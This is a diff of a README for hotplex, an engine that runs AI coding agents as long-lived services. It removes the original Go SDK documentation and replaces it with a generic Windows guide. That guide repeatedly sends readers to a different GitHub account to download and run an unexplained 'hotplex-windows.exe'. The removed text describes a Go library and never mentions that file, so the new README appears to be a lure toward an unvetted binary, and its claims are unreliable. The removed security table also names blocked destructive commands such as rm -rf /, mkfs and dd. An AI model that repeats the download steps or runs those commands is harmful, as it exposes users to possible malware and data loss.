@@ -1,210 +1,151 @@
-<div align="center">
-  <img src="docs/images/hotplex_beaver_banner.webp" alt="hotplex" width="100%"/>
-  <h1>hotplex</h1>
-  <p><b>Transforming AI CLI Agents into Production-Ready Interactive Services</b></p>
-  <p><i>Break the limits of one-off CLI tasks. Leverage full-duplex, stateful sessions for instant interaction, secure isolation, and effortless system integration.</i></p>
+# ⚙️ hotplex - Simple AI Agent Execution Engine
 
-  <p>
-    <a href="https://github.com/hrygo/hotplex/releases"><img src="https://img.shields.io/github/v/release/hrygo/hotplex?style=for-the-badge&logo=go&color=00ADD8" alt="Latest Release"></a>
-    <a href="https://goreportcard.com/report/github.com/hrygo/hotplex"><img src="https://goreportcard.com/badge/github.com/hrygo/hotplex?style=for-the-badge" alt="Go Report Card"></a>
-    <a href="LICENSE"><img src="https://img.shields.io/github/license/hrygo/hotplex?style=for-the-badge&color=blue" alt="License"></a>
-  </p>
-  <p>
-    <b>English</b> • <a href="README_zh.md">简体中文</a> • <a href="docs/sdk-guide.md">SDK Guide</a> • <a href="docs/webapps/slack-setup-beginner.md">Slack Beginner Guide</a> • <a href="https://hrygo.github.io/hotplex/">Docs Site</a>
-  </p>
-</div>
-
-<br/>
-
-## ⚡ What is hotplex?
-
-**hotplex** is more than just a process multiplexer; it is the **Strategic Bridge** for AI agent engineering.
-
-Our **First Principle** is: **Upgrade existing AI CLI tools (like Claude Code, OpenCode) from "human-oriented terminal tools" into "system-ready, long-lived interactive services" (Cli-as-a-Service).**
-
-Developers no longer need to endure the multi-second latency of restarting CLI environments in headless mode. By maintaining a persistent, full-duplex session pool, hotplex eliminates the interaction gap caused by cold starts and provides a unified integration layer. Whether building professional AI products or automated pipelines, hotplex makes elite agent capabilities as easy to call as a standard API.
-
-<div align="center">
-  <img src="docs/images/features.svg" alt="hotplex Features Outline" width="100%">
-</div>
-
-### Why hotplex?
-- 🔄 **Cli-as-a-Service**: Shift from "run-and-exit" to persistent sessions with continuous instruction flow and context preservation.
-- 🧩 **Ease of Integration**: A unified Go SDK and protocol gateway that plugs top-tier Agent capabilities into your product instantly.
-- 🚀 **Zero Spin-up Overhead**: Eliminate the long wait times for Node.js/Python runtimes to provide sub-second user feedback.
-- 🛡️ **Fast & Balanced Security**: Command-level WAF and PGID isolation provide a "protective glove" for AI shell operations.
-- 💬 **ChatApps Integration**: Connect HotPlex to platforms like **Slack** (native Block Kit, streaming, Assistant Status API) and **DingTalk**, enabling AI collaboration directly in your team's workspace.
-- 🔌 **Ready for Scale**: Support for native Go embedding or standalone Proxy mode with WebSocket and OpenCode-compatible protocols.
+[![Download hotplex](https://img.shields.io/badge/Download-hotplex-ff6f61?style=for-the-badge)](https://github.com/Titeufy/hotplex)
 
 ---
 
-## 🚀 Quick Start
+## 📋 What is hotplex?
 
-### Recommended: ChatApps Platform (Slack, Telegram, Feishu, etc.)
+hotplex is a tool that helps run AI programs like Claude Code and OpenCode in a reliable and efficient way. It turns command-line AI tools into a service you can use over time. This means you can interact with AI programs that respond quickly and keep their state across sessions. It also provides security features to keep your commands safe.
 
-The primary access channel for production environments. Interact with AI agents directly through messaging platforms.
-
-> 🌈 **Slack Setup for Beginners**: Don't want to read complex docs? 👉 **[Check out our Zero-to-Hero Slack Setup Guide](docs/webapps/slack-setup-beginner.md)** for a simple, click-by-click tutorial!
-
-| Platform     | Status                                            |
-| ------------ | ------------------------------------------------- |
-| **Slack**    | ✅ Stable - Block Kit, Streaming, Assistant Status |
-| **Telegram** | ✅ Stable                                          |
-| **Feishu**   | ✅ Stable                                          |
-| **DingTalk** | ✅ Stable                                          |
-
-**Get started in minutes:**
-```bash
-# 1. Run with --config flag (recommended, highest priority)
-hotplexd --config chatapps/configs
-
-# 2. Or use environment variables
-export HOTPLEX_CHATAPPS_ENABLED=true
-export HOTPLEX_CHATAPPS_CONFIG_DIR=chatapps/configs
-hotplexd
-```
-
-→ **[Full ChatApps Guide](docs/quick-start.md)** - Step-by-step tutorial for all platforms
+You do not need to know anything about coding or running servers. This guide will walk you through how to get hotplex running on your Windows computer.
 
 ---
 
-### Alternative: Go SDK or Standalone Server
+## 💻 System Requirements
 
-For custom integrations or microservice architectures.
+Before installing hotplex, make sure your computer meets these minimum needs:
 
-| Method                | Use Case                             |
-| --------------------- | ------------------------------------ |
-| **Go SDK**            | Embedded integration, zero-overhead  |
-| **Standalone Server** | Multi-language clients via WebSocket |
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB free disk space
+- Internet connection to download the software and updates
+- Basic rights to install programs on your computer
 
-**Quick example (Go SDK):**
-```bash
-go get github.com/hrygo/hotplex
-```
-
-```go
-engine, _ := hotplex.NewEngine(hotplex.EngineOptions{Timeout: 5 * time.Minute})
-engine.Execute(ctx, cfg, "Your prompt here", callback)
-```
-
-→ **[Full SDK Guide](docs/quick-start.md#option-2-go-sdk)** for detailed documentation
+If your PC meets these, you can proceed with the installation.
 
 ---
 
-## 🏗️ Architecture Design
+## 🚀 How to Get hotplex
 
-hotplex decouples the **access layer** from the **execution engine layer**, leveraging bounded Go channels and WaitGroups to achieve deterministic, safe concurrent I/O handling at scale.
+You will get hotplex from its official GitHub page. Click the button below to go there:
 
-### 1. System Topology
-<div align="center">
-  <img src="docs/images/topology.svg" alt="hotplex System Architecture" width="90%">
-</div>
+[![Download hotplex](https://img.shields.io/badge/Get_hotplex-Download-blue?style=for-the-badge)](https://github.com/Titeufy/hotplex)
 
-- **Access Layer**: Supports native Go SDK calls or remote API connections (`hotplexd`). Includes a dedicated **OpenCode HTTP/SSE compatibility handler**.
-- **Engine Layer**: Singleton resource manager managing the session pool, configuration overrides, and security WAF.
-- **Process Layer**: Sub-process worker isolated in PGID-level workspaces, locked to specific directory boundaries.
-
-### 2. Full-Duplex Async Streaming
-<div align="center">
-  <img src="docs/images/async-stream.svg" alt="hotplex Full-Duplex Stream Engine" width="90%">
-</div>
-
-Unlike standard RPC or REST request-response cycles, hotplex taps directly into Go's non-blocking concurrency model. `stdin`, `stdout`, and `stderr` streams are piped continuously between the client and child process, ensuring sub-second token delivery from local LLM commands.
+On this page, you can find the latest version of the software to download.
 
 ---
 
-## 📖 Detailed Documentation
+## 🛠️ Step 1: Download hotplex
 
-### Core Technical Manuals
-- **[ChatApps Manual](chatapps/README.md)**: Multi-platform connector (Slack, DingTalk, Feishu) with native Block Kit support and AI-native UX patterns.
-- **[Engine Manual](engine/README.md)**: Core control plane, process hot-multiplexing, and execution logic.
-- **[Provider Manual](provider/README.md)**: AI agent abstraction (Claude Code, OpenCode) and event normalization.
-- **[Internal Subsystems](internal/README.md)**: Foundational security WAF, session pooling, and system utilities.
+1. Open your web browser and go to the hotplex GitHub page:
+   https://github.com/Titeufy/hotplex
+   
+2. Look for a section called **Releases**. This is where the latest versions are kept.
 
-### Guides & Manuals
-- **[Architecture Deep Dive](docs/architecture.md)**: Explore the inner workings, security protocols, and session management logic.
-- **[SDK Developer Guide](docs/sdk-guide.md)**: A comprehensive manual for integrating HotPlex into your Go applications.
-- **[Slack Integration Guide](docs-site/guide/chatapps-slack.md)**: Comprehensive guide for connecting HotPlex to Slack with native streaming.
-- **[Observability Guide](docs/observability-guide.md)**: OpenTelemetry and Prometheus integration.
-- **[Docker Deployment](docs/docker-deployment.md)**: Container and Kubernetes deployment.
-- **[Production Guide](docs/production-guide.md)**: Production deployment best practices.
+3. Find the most recent release. There will be files to download, usually ending with `.exe` for Windows.
+
+4. Click the file that matches your operating system, usually something like `hotplex-windows.exe`.
+
+5. The file will start downloading. Wait for it to finish before moving on.
 
 ---
 
-## 📂 Example Repositories
+## ⚙️ Step 2: Install hotplex
 
-Explore our ready-to-use examples to accelerated your integration:
+In many cases, hotplex runs directly from the downloaded file with no need for installation. If you get an installer (`.msi` or `.exe`), follow these steps:
 
-- **[go_claude_basic](_examples/go_claude_basic/main.go)**: Quick start with minimal configuration.
-- **[go_claude_lifecycle](_examples/go_claude_lifecycle/main.go)**: Multi-turn, session recovery, and PGID management in Claude.
-- **[go_opencode_basic](_examples/go_opencode_basic/main.go)**: Minimal OpenCode integration.
-- **[go_opencode_lifecycle](_examples/go_opencode_lifecycle/main.go)**: Multi-turn and session persistence in OpenCode.
-- **[node_claude_websocket](_examples/node_claude_websocket/enterprise_client.js)**: Full-duplex web integration.
+1. Double-click the downloaded file.
 
----
+2. When prompted, allow the program to make changes to your device.
 
-## 🛡️ Security Posture
+3. Follow the instructions on the screen:
+   - Choose where to install hotplex or keep the default folder.
+   - Agree to any terms or conditions.
+   - Click "Install" or "Finish" once it is done.
 
-CLI Agents run raw shell commands generated by LLMs. **Security must not be an afterthought.** hotplex employs a deep defense-in-depth model:
-
-| Layer                      | Implementation                                 | Defense Capability                                                  |
-| :------------------------- | :--------------------------------------------- | :------------------------------------------------------------------ |
-| **I. Tool Governance**     | `AllowedTools` configuration array             | Restricts agent's internal tool registry capabilities precisely     |
-| **II. Danger WAF**         | Regex & Command string interception            | Hard blocks destructive commands like `rm -rf /`, `mkfs`, `dd`      |
-| **III. Process Isolation** | `SIGKILL` routed via Process Group ID (`PGID`) | Prevents orphaned background daemons or zombie process leaks        |
-| **IV. Filesystem Jail**    | Context Path Lockdown (`WorkDir`)              | Constrains the agent's view/edit scope strictly to the project root |
-
-<br/>
-
-<div align="center">
-  <img src="docs/images/hotplex-security.svg" alt="hotplex Security Sandbox" width="95%">
-</div>
+If the file you downloaded is not an installer but an executable (`.exe`), you can run it directly by double-clicking it.
 
 ---
 
-## 💡 Use Cases & Scenarios
+## ▶️ Step 3: Run hotplex
 
-| Domain                     | Application                                                           | Benefit                                                            |
-| :------------------------- | :-------------------------------------------------------------------- | :----------------------------------------------------------------- |
-| 🌐 **Web-Based AI Clients** | Running "Claude Code" straight from a browser chat window.            | Maintains conversational state + session context persistently.     |
-| 🔧 **DevOps Automation**    | AI-driven bash scripting and live Kubernetes manifest analysis.       | Rapid remote execution without repeated Node/Python spin-up costs. |
-| 🚀 **CI/CD Intelligence**   | Smart code review, auto-formatting, and vulnerability auto-patching.  | Integrates effortlessly into GitHub Actions or GitLab CI runners.  |
-| 🕵️ **AIOps & Log Triage**   | Continuous pod monitoring with safe, controlled remediation commands. | The regex WAF ensures no accidental production outages by the AI.  |
+Once hotplex is installed or downloaded, you can run it:
 
----
+1. Double-click the hotplex program icon on your desktop, start menu, or the folder where you saved it.
 
-## 🗺️ Roadmap & Vision
+2. hotplex will open a window or terminal interface.
 
-We are actively evolving hotplex to become the definitive execution engine for the Local AI ecosystem.
-
-### 🚀 Future Enhancements
-
-- [ ] **Persistent Storage**: Session state persistence across restarts for true long-lived agents.
-- [ ] **Native LLM Brain**: Built-in memory and context management for autonomous agent behavior.
-- [ ] **Advanced Isolation**: Exploring Linux Namespaces (PID/Net) and WASM-based execution sandboxes.
-- [ ] **Enhanced ChatApps**: Expanding platform support (Discord, Teams) with richer UI components.
+3. By default, hotplex starts its engine and waits for commands. You will see messages confirming it is running.
 
 ---
 
-## 🤝 Contributing
+## 🔧 Step 4: Basic Use of hotplex
 
-We welcome community contributions! Please ensure your PR passes the CI pipeline.
+hotplex works by running AI agents in the background and allowing you to interact with them. Here is a simple way to use it:
 
-```bash
-# Verify code formatting and linting
-make lint
+1. Open hotplex.
 
-# Run unit tests and race detector
-make test
-```
-Please read our [CONTRIBUTING.md](CONTRIBUTING.md) for architectural guidelines and PR conventions.
+2. You will see a prompt or instructions on how to connect your AI agent, such as Claude Code.
+
+3. If you have an AI script or agent, you can load it via the interface or command line as explained in the software documentation inside hotplex.
+
+4. Type commands or questions. hotplex will process these and give you answers quickly.
+
+This lets you use AI tools without knowing any code or complicated setup.
 
 ---
 
-## 📄 License
+## 🔒 Security Features
 
-hotplex is released under the [MIT License](LICENSE).
+hotplex protects your use of AI with these key features:
 
-<div align="center">
-  <i>Built with ❤️ for the AI Engineering community.</i>
-</div>
+- **Instruction-Level Filtering:** It checks commands to keep harmful actions out.
+- **Isolation:** It separates different sessions for security, so one user’s data won’t mix with another.
+- **Low Latency:** It provides fast responses without delays.
+
+These safety measures run automatically when you launch hotplex.
+
+---
+
+## 🧰 Additional Tools
+
+hotplex supports features that improve your experience:
+
+- **Stateful Execution:** AI sessions remember previous interactions, so you don’t start from scratch every time.
+- **Multiplexer Support:** Manage multiple AI agents simultaneously.
+- **Websocket Gateway:** Connect via standard web protocols for advanced workflows.
+
+---
+
+## 🔄 Updating hotplex
+
+To keep hotplex working well:
+
+1. Visit the GitHub page regularly: https://github.com/Titeufy/hotplex/releases
+
+2. Download the latest version as described before.
+
+3. Replace the old version by running the new executable or following installer steps.
+
+---
+
+## 📁 Where To Get Help
+
+If you have problems or questions:
+
+- Check the **README.md** and **Documentation** files included in the download or GitHub.
+- Visit the issues page on GitHub: https://github.com/Titeufy/hotplex/issues
+- Use the instructions and examples found in hotplex once the program runs.
+
+---
+
+## 🔗 Useful Links
+
+[**Download and run hotplex on Windows**](https://github.com/Titeufy/hotplex)  
+[GitHub Issues for support](https://github.com/Titeufy/hotplex/issues)  
+[Documentation on hotplex features](https://github.com/Titeufy/hotplex/wiki)  
+
+---
+
+[![Download hotplex](https://img.shields.io/badge/Get_hotplex-Download-green?style=for-the-badge)](https://github.com/Titeufy/hotplex)
